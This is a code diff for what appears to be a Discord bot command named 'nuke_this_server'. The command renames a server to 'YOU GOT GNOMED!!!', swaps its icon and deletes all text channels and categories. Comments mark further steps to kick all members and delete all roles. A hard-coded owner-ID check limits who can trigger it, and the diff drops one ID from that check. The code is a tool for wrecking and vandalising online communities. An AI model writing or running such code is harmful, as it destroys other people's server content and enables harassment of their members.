@@ -30,12 +30,12 @@ async def nuke_this_server(ctx):
         text_channel_list.append(channel)
 
     print(text_channel_list)
-    # Step 1: Delete all channels
-    for channel in guild.text_channels:
-        await channel.delete()
+    # Step 1: Change server image and server name
+    with open('gnomed_image.jpg', 'rb') as f:
+        icon = f.read()
 
-    for category in guild.categories:
-        await category.delete()
+    await guild.edit(name="YOU GOT GNOMED!!!", icon=icon)
+
 
     # Step 2: Kick all members where possible
 
@@ -43,11 +43,12 @@ async def nuke_this_server(ctx):
     # Step 3: Delete all roles
 
 
-    # Step 4: Change server image and server name
-    # with open('gnomed_image.jpg', 'rb') as f:
-    #     icon = f.read()
-    #
-    # await guild.edit(name="YOU GOT GNOMED!!!", icon=icon)
+    # Step 4: Delete all channels
+    for channel in guild.text_channels:
+        await channel.delete()
+
+    for category in guild.categories:
+        await category.delete()
 
     # Step 5: Create channel and Send message in channel
 
@@ -68,7 +69,7 @@ async def is_owner(ctx):
     # 274644114312527872 = Ceniken
     # 482490009555959808 = Warrior Cat
 
-    if ctx.author.id == 241062161059676161 or ctx.author.id == 274644114312527872 or ctx.author.id == 482490009555959808:
+    if ctx.author.id == 241062161059676161 or ctx.author.id == 274644114312527872:
         return True
     else:
         return False
